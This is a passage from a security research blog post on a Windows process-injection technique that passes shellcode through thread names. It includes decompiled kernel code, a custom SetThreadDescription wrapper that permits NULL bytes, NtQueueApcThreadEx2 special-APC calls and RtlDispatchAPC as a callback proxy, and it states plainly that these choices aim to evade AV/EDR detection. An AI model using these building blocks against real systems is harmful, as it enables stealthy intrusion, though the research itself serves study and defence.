|| *</span><span class="enlighter-g1">(</span><span class="enlighter-text">Buffer + </span><span class="enlighter-g1">(</span><span class="enlighter-text">len </span><span class="enlighter-g1">&gt;&gt;</span><span class="enlighter-text"> 1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> - 1</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      v12 = 2i64;</span></div></div><div class=""><div><span class="enlighter-text">      v11 = &amp;EtwpNull;</span></div></div><div class=""><div><span class="enlighter-text">      v1 = 3;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    v10 = 2i64;</span></div></div><div class=""><div><span class="enlighter-text">    buf = &amp;EtwpNull;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-m0">EtwTraceKernelEvent</span><span class="enlighter-g1">(</span><span class="enlighter-text">v8, v1, 2, 1352, </span><span class="enlighter-n2">0x501802</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">__int64 __fastcall EtwTraceThreadSetName(_ETHREAD *thread)
{
  int v1; // r10d
  _UNICODE_STRING *ThreadName; // rax
  __int64 *Buffer; // rcx
  unsigned int Length; // edx
  unsigned __int64 len; // rax
  int v7[4]; // [rsp+30h] [rbp-50h] BYREF
  __int64 v8[2]; // [rsp+40h] [rbp-40h] BYREF
  __int64 *buf; // [rsp+50h] [rbp-30h]
  __int64 v10; // [rsp+58h] [rbp-28h]
  __int64 *v11; // [rsp+60h] [rbp-20h]
  __int64 v12; // [rsp+68h] [rbp-18h]

  v7[0] = thread-&gt;Cid.UniqueProcess;
  v1 = 2;
  v7[1] = thread-&gt;Cid.UniqueThread;
  v8[0] = v7;
  ThreadName = thread-&gt;ThreadName;
  v7[2] = 0;
  v8[1] = 8i64;
  if ( ThreadName &amp;&amp; (Buffer = ThreadName-&gt;Buffer) != 0i64 )
  {
    Length = ThreadName-&gt;Length;
    len = 0x800i64;
    if ( Length &lt; 0x800u )
      len = Length;
    buf = Buffer;
    v10 = len;
    if ( !len || *(Buffer + (len &gt;&gt; 1) - 1) )
    {
      v12 = 2i64;
      v11 = &amp;EtwpNull;
      v1 = 3;
    }
  }
  else
  {
    v10 = 2i64;
    buf = &amp;EtwpNull;
  }
  return EtwTraceKernelEvent(v8, v1, 2, 1352, 0x501802);
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">__int64 __fastcall EtwTraceThreadSetName(_ETHREAD *thread)
{
  int v1; // r10d
  _UNICODE_STRING *ThreadName; // rax
  __int64 *Buffer; // rcx
  unsigned int Length; // edx
  unsigned __int64 len; // rax
  int v7[4]; // [rsp+30h] [rbp-50h] BYREF
  __int64 v8[2]; // [rsp+40h] [rbp-40h] BYREF
  __int64 *buf; // [rsp+50h] [rbp-30h]
  __int64 v10; // [rsp+58h] [rbp-28h]
  __int64 *v11; // [rsp+60h] [rbp-20h]
  __int64 v12; // [rsp+68h] [rbp-18h]

  v7[0] = thread-&gt;Cid.UniqueProcess;
  v1 = 2;
  v7[1] = thread-&gt;Cid.UniqueThread;
  v8[0] = v7;
  ThreadName = thread-&gt;ThreadName;
  v7[2] = 0;
  v8[1] = 8i64;
  if ( ThreadName &amp;&amp; (Buffer = ThreadName-&gt;Buffer) != 0i64 )
  {
    Length = ThreadName-&gt;Length;
    len = 0x800i64;
    if ( Length &lt; 0x800u )
      len = Length;
    buf = Buffer;
    v10 = len;
    if ( !len || *(Buffer + (len &gt;&gt; 1) - 1) )
    {
      v12 = 2i64;
      v11 = &amp;EtwpNull;
      v1 = 3;
    }
  }
  else
  {
    v10 = 2i64;
    buf = &amp;EtwpNull;
  }
  return EtwTraceKernelEvent(v8, v1, 2, 1352, 0x501802);
}</pre>



<h3 class="wp-block-heading" id="removing-the-null-byte-limitations">Removing the NULL byte limitations</h3>



<p class="wp-block-paragraph">Setting the thread name by the official API imposes some limitations on the buffer. It has to be a valid Unicode string, that means, an empty WCHAR will be used as a buffer terminator. The size of WCHAR is two bytes – so if our shellcode has any double NULL byte inside only the part before it will be copied. This is a common limitation encountered whenever the shellcode is to be passed via buffer dedicated to hold strings. To solve this issue, shellcode encoders have been invented: they allow to convert a buffer into a format that is free from NULL bytes. We can use one of them in our case as well.</p>



<p class="wp-block-paragraph">However, by analyzing the implementation of the above API, we realized that it is actually possible to avoid this limitation at its root. When the Thread Name is copied between different buffers, the declared length from <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string">the <code>UNICODE_STRING</code> structure</a> is used, along with&nbsp;<code>memmove</code>&nbsp;function, which does not treat NULL bytes as terminators. The only function that imposes the NULL byte constraint is&nbsp;<code>SetThreadDescription</code>. Underneath, it calls&nbsp;<code>RtlInitUnicodeStringEx</code>&nbsp;that takes the passed WCHAR buffer, and uses it to initializes the UNICODE_STRING structure. The input buffer must be NULL terminated, and the length to be saved in the structure is determined basing on the position of this character.</p>



<p class="wp-block-paragraph">We can create an easy workaround for our problem, by using a custom implementation of SetThreadDescription:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">HRESULT </span><span class="enlighter-m0">mySetThreadDescription</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hThread, </span><span class="enlighter-k8">const</span><span class="enlighter-text"> BYTE* buf, size_t buf_size</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    UNICODE_STRING DestinationString = </span><span class="enlighter-g1">{</span><span class="enlighter-text"> 0 </span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    BYTE* padding = </span><span class="enlighter-g1">(</span><span class="enlighter-text">BYTE*</span><span class="enlighter-g1">)</span><span class="enlighter-text">::</span><span class="enlighter-m0">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">buf_size + </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">WCHAR</span><span class="enlighter-g1">)</span><span class="enlighter-text">, 1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    ::</span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">padding, </span><span class="enlighter-s1">'A'</span><span class="enlighter-text">, buf_size</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">auto</span><span class="enlighter-text"> pRtlInitUnicodeStringEx = </span><span class="enlighter-k3">reinterpret_cast</span><span class="enlighter-g1">&lt;</span><span class="enlighter-k0">decltype</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;RtlInitUnicodeStringEx</span><span class="enlighter-g1">)&gt;(</span><span class="enlighter-m0">GetProcAddress</span><span class="enlighter-g1">(</span><span class="enlighter-m0">GetModuleHandle</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ntdll.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span><span class="enlighter-s0">"RtlInitUnicodeStringEx"</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">pRtlInitUnicodeStringEx</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;DestinationString, </span><span class="enlighter-g1">(</span><span class="enlighter-text">PCWSTR</span><span class="enlighter-g1">)</span><span class="enlighter-text">padding</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// fill with our real content:</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ::</span><span class="enlighter-m0">memcpy</span><span class="enlighter-g1">(</span><span class="enlighter-text">DestinationString.</span><span class="enlighter-m3">Buffer</span><span class="enlighter-text">, buf, buf_size</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">auto</span><span class="enlighter-text"> pNtSetInformationThread = </span><span class="enlighter-k3">reinterpret_cast</span><span class="enlighter-g1">&lt;</span><span class="enlighter-k0">decltype</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;NtSetInformationThread</span><span class="enlighter-g1">)&gt;(</span><span class="enlighter-m0">GetProcAddress</span><span class="enlighter-g1">(</span><span class="enlighter-m0">GetModuleHandle</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ntdll.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span><span class="enlighter-s0">"NtSetInformationThread"</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    NTSTATUS status = </span><span class="enlighter-m0">pNtSetInformationThread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, </span><span class="enlighter-g1">(</span><span class="enlighter-text">THREADINFOCLASS</span><span class="enlighter-g1">)(</span><span class="enlighter-text">ThreadNameInformation</span><span class="enlighter-g1">)</span><span class="enlighter-text">, &amp;DestinationString, 0x10u</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    ::</span><span class="enlighter-m0">free</span><span class="enlighter-g1">(</span><span class="enlighter-text">padding</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-m0">HRESULT_FROM_NT</span><span class="enlighter-g1">(</span><span class="enlighter-text">status</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size)
{
    UNICODE_STRING DestinationString = { 0 };
    BYTE* padding = (BYTE*)::calloc(buf_size + sizeof(WCHAR), 1);
    ::memset(padding, 'A', buf_size);

    auto pRtlInitUnicodeStringEx = reinterpret_cast&lt;decltype(&amp;RtlInitUnicodeStringEx)&gt;(GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlInitUnicodeStringEx"));
    pRtlInitUnicodeStringEx(&amp;DestinationString, (PCWSTR)padding);
    // fill with our real content:
    ::memcpy(DestinationString.Buffer, buf, buf_size);

    auto pNtSetInformationThread = reinterpret_cast&lt;decltype(&amp;NtSetInformationThread)&gt;(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationThread"));
    NTSTATUS status = pNtSetInformationThread(hThread, (THREADINFOCLASS)(ThreadNameInformation), &amp;DestinationString, 0x10u);
    ::free(padding);
    return HRESULT_FROM_NT(status);
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size)
{
    UNICODE_STRING DestinationString = { 0 };
    BYTE* padding = (BYTE*)::calloc(buf_size + sizeof(WCHAR), 1);
    ::memset(padding, 'A', buf_size);

    auto pRtlInitUnicodeStringEx = reinterpret_cast&lt;decltype(&amp;RtlInitUnicodeStringEx)&gt;(GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlInitUnicodeStringEx"));
    pRtlInitUnicodeStringEx(&amp;DestinationString, (PCWSTR)padding);
    // fill with our real content:
    ::memcpy(DestinationString.Buffer, buf, buf_size);

    auto pNtSetInformationThread = reinterpret_cast&lt;decltype(&amp;NtSetInformationThread)&gt;(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationThread"));
    NTSTATUS status = pNtSetInformationThread(hThread, (THREADINFOCLASS)(ThreadNameInformation), &amp;DestinationString, 0x10u);
    ::free(padding);
    return HRESULT_FROM_NT(status);
}</pre>



<p class="wp-block-paragraph">This function initializes UNICODE_STRING basing on a dummy buffer of a required length, and then fills it with the actual content (which may contain NULL bytes). Then, the prepared structure is passed to the thread using the low-level API:&nbsp;<code>NtSetInformationThread</code>.</p>



<h3 class="wp-block-heading" id="ntqueueapcthreadex2">NtQueueApcThreadEx2</h3>



<p class="wp-block-paragraph">In the implementation of our injection technique, we rely on calling some APIs remotely within the target process.</p>



<p class="wp-block-paragraph">Windows supports adding routines to&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Asynchronous Procedure Call (APC)</a>&nbsp;queue of existing threads, giving the ability to run code in a remote process without the need to create an additional thread. At a low level, this functionality is exposed by the function:&nbsp;<a href="https://ntdoc.m417z.com/ntqueueapcthreadex"><code>NtQueueApcThreadEx</code></a>(and its wrapper:<a href="https://ntdoc.m417z.com/ntqueueapcthread"><code>NtQueueApcThread</code></a>). The official, higher-level API recommended by Microsoft is&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc"><code>QueueUserAPC</code></a>&nbsp;– which works as a wrapper for the lower-level function. We are free to add APC to a remote thread, as long as its handle is opened with&nbsp;<code>THREAD_SET_CONTEXT</code>&nbsp;access.</p>



<p class="wp-block-paragraph">The related APIs have often been misused in&nbsp;<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf">variety of different (old and new) injection techniques</a>, and are&nbsp;<a href="https://attack.mitre.org/techniques/T1055/004/">described in the MITRE database</a>. APC allows for running remote code by hopping onboard an existing thread, and that is stealthier than the common alternative of creating a remote thread. Creating a new thread triggers a kernel callback (<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine"><code>PsSetCreateThreadNotifyRoutine</code></a>/&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex"><code>Ex</code></a><strong>)</strong>, often used by kernel-mode components of AV / EDR products for detection.</p>



<p class="wp-block-paragraph">In addition, APC gives us more freedom in passing parameters to the remote function. In case of a new thread creation, we can pass only one argument – and here we are allowed to use 3.</p>



<p class="wp-block-paragraph">However, using the plain&nbsp;<a href="https://ntdoc.m417z.com/ntqueueapcthread">NtQueueApcThread</a>&nbsp;has a drawback. To add our function to the APC queue, we need to first find the thread that is in an alertable state (waiting for a signal). Our callback is executed only when the thread is alerted. Details on how to approach this obstacle are explained i.e.&nbsp;in the&nbsp;<a href="https://modexp.wordpress.com/2019/08/27/process-injection-apc/">blog post by <em>modexp</em></a>. Relying on alertable threads limits our choices for the targets, and scanning for them adds some complexity to the injector.</p>



<p class="wp-block-paragraph">Fortunately, a workaround to this problem appeared since the new types of APC callbacks have been introduced on Windows. They are defined by&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags"><code>QUEUE_USER_APC_FLAGS</code></a>&nbsp;. Since the introduction of this type, the argument&nbsp;<code>ReserveHandle</code>&nbsp;in&nbsp;<a href="https://ntdoc.m417z.com/ntqueueapcthreadex"><code>NtQueueApcThreadEx</code></a>&nbsp;was replaced with&nbsp;<code>UserApcOption</code>&nbsp;where we can pass such a flag, modifying the function’s behavior. The most interesting from our perspective is Special User APC (&nbsp;<code>QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC</code>) that allows us to inject into threads that are not necessarily in the alertable state:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
<p class="wp-block-paragraph"><em><strong>Quote&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc2">from MSDN</a>:</strong></em></p>



<p class="wp-block-paragraph"><em>Special user-mode APCs always execute, even if the target thread is not in an alertable state. For example, if the target thread is currently executing user-mode code, or if the target thread is currently performing an alertable wait, the target thread will be interrupted immediately for APC execution. If the target thread is executing a system call, or performing a non-alertable wait, the APC will be executed after the system call or non-alertable wait finishes (the wait is not interrupted).</em></p>
</div></div>
</blockquote>



<p class="wp-block-paragraph">Note that the potential of the new API for improving injection methods, was already noticed by researchers, and is described, i. e. in&nbsp;<a href="https://repnz.github.io/posts/apc/user-apc/">this blog by&nbsp;<em>repnz</em></a>.</p>



<p class="wp-block-paragraph">This new APC type has also been criticized for the associated risk of introducing stability issues in the application and making it harder to synchronize the threads (i.e.&nbsp;<a href="https://www.codeproject.com/Articles/5355373/Understanding-Windows-Asynchronous-Procedure-Calls">here</a>). However, it should not be a big problem in our case, as we are using it to run a code that is completely independent from the running application and does not use any resources that should create concurrency issues.</p>



<p class="wp-block-paragraph">The new API supporting the added APC types was officially added in Windows 11 (Build 22000). It is exposed by the function:&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc2"><code>QueueUserAPC2</code></a>, which, at the lower level, was implemented by a new version of the well-known&nbsp;<code>NtQueueApcThreadEx</code>. The new function is simply called&nbsp;<code>NtQueueApcThreadEx2</code>&nbsp;and has the following prototype (<a href="https://ntdoc.m417z.com/ntqueueapcthreadex2">source</a>):</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">NTSYSCALLAPI</span></div></div><div class=""><div><span class="enlighter-text">NTSTATUS</span></div></div><div class=""><div><span class="enlighter-text">NTAPI</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-m0">NtQueueApcThreadEx2</span><span class="enlighter-g1">(</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    _In_ HANDLE ThreadHandle,</span></div></div><div class=""><div><span class="enlighter-text">    _In_opt_ HANDLE ReserveHandle, </span><span class="enlighter-c0">// NtAllocateReserveObject</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    _In_ ULONG ApcFlags, </span><span class="enlighter-c0">// QUEUE_USER_APC_FLAGS</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    _In_ PPS_APC_ROUTINE ApcRoutine,</span></div></div><div class=""><div><span class="enlighter-text">    _In_opt_ PVOID ApcArgument1,</span></div></div><div class=""><div><span class="enlighter-text">    _In_opt_ PVOID ApcArgument2,</span></div></div><div class=""><div><span class="enlighter-text">    _In_opt_ PVOID ApcArgument3</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx2(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle, // NtAllocateReserveObject
    _In_ ULONG ApcFlags, // QUEUE_USER_APC_FLAGS
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx2(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle, // NtAllocateReserveObject
    _In_ ULONG ApcFlags, // QUEUE_USER_APC_FLAGS
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );</pre>



<p class="wp-block-paragraph">It turns out, we can find this API on Windows 10, since build&nbsp;<code>19045</code>&nbsp;– which is earlier than the officially supported version.</p>



<p class="wp-block-paragraph">As this is a relatively new API, associated with a new syscall, using it can also give an opportunity to bypass some of the products that are not yet watching it.</p>



<p class="wp-block-paragraph">We use this API for a remote function execution in our implementation of Thread Name-Calling. Still, it is possible to implement a (less stealthy) variant of Thread Name-Calling, using the old API, which we will also demonstrate.</p>



<h3 class="wp-block-heading" id="rtldispatchapc">RtlDispatchAPC</h3>



<p class="wp-block-paragraph">This function is not a requirement for our technique, but rather a helper that makes the shellcode execution a bit more stealthy.</p>



<p class="wp-block-paragraph">Once the shellcode is successfully copied into the remote process, we need to run it. We decided to do it by adding its start address to the APC queue of the remote thread. However, since our shellcode is in a private memory rather than in any mapped module, passing its address directly may trigger some alerts. To evade this indicator it is beneficial to use some legitimate function as a proxy. There are multiple functions that allow to pass a callback to be executed. Many of them have been documented extensively&nbsp;<a href="https://www.hexacorn.com/blog/2016/12/17/shellcode-ill-call-you-back/">by Hexacorn in his blog</a>. Some interesting additions have been&nbsp;<a href="https://modexp.wordpress.com/2024/02/13/delegated-nt-dll/">noted by&nbsp;<em>modexp</em>&nbsp;blog</a>.</p>



<p class="wp-block-paragraph">The function&nbsp;<code>RtlDispatchAPC</code>&nbsp;looks like a perfect candidate. It has three arguments, so it is compatible with APC API. The implementation:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k5">void</span><span class="enlighter-text"> __fastcall </span><span class="enlighter-m0">RtlDispatchAPC</span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">__fastcall *callback</span><span class="enlighter-g1">)(</span><span class="enlighter-text">__int64</span><span class="enlighter-g1">)</span><span class="enlighter-text">, __int64 callback_arg, </span><span class="enlighter-k5">void</span><span class="enlighter-text"> *a3</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  __int64 v6 = 72LL;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k5">int</span><span class="enlighter-text"> v7 = 1;</span></div></div><div class=""><div><span class="enlighter-text">  __int128 v8 = 0LL;</span></div></div><div class=""><div><span class="enlighter-text">  __int128 v9 = 0LL;</span></div></div><div class=""><div><span class="enlighter-text">  __int128 v10 = 0LL;</span></div></div><div class=""><div><span class="enlighter-text">  __int64 v11 = 0LL;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> a3 == </span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text"> *</span><span class="enlighter-g1">)</span><span class="enlighter-text">-1LL </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">callback</span><span class="enlighter-g1">(</span><span class="enlighter-text">callback_arg</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">RtlActivateActivationContextUnsafeFast</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;v6, a3</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">callback</span><span class="enlighter-g1">(</span><span class="enlighter-text">callback_arg</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">RtlDeactivateActivationContextUnsafeFast</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;v6</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">RtlReleaseActivationContext</span><span class="enlighter-g1">(</span><span class="enlighter-text">a3</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">void __fastcall RtlDispatchAPC(void (__fastcall *callback)(__int64), __int64 callback_arg, void *a3)
{
  __int64 v6 = 72LL;
  int v7 = 1;
  __int128 v8 = 0LL;
  __int128 v9 = 0LL;
  __int128 v10 = 0LL;
  __int64 v11 = 0LL;

  if ( a3 == (void *)-1LL )
  {
    callback(callback_arg);
  }
  else
  {
    RtlActivateActivationContextUnsafeFast(&amp;v6, a3);
    callback(callback_arg);
    RtlDeactivateActivationContextUnsafeFast(&amp;v6);
    RtlReleaseActivationContext(a3);
  }
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">void __fastcall RtlDispatchAPC(void (__fastcall *callback)(__int64), __int64 callback_arg, void *a3)
{
  __int64 v6 = 72LL;
  int v7 = 1;
  __int128 v8 = 0LL;
  __int128 v9 = 0LL;
  __int128 v10 = 0LL;
  __int64 v11 = 0LL;

  if ( a3 == (void *)-1LL )
  {
    callback(callback_arg);
  }
  else
  {
    RtlActivateActivationContextUnsafeFast(&amp;v6, a3);
    callback(callback_arg);
    RtlDeactivateActivationContextUnsafeFast(&amp;v6);
    RtlReleaseActivationContext(a3);
  }
}</pre>



<p class="wp-block-paragraph">To make the above function execute our shellcode we need to pass it the following parameters:</p>



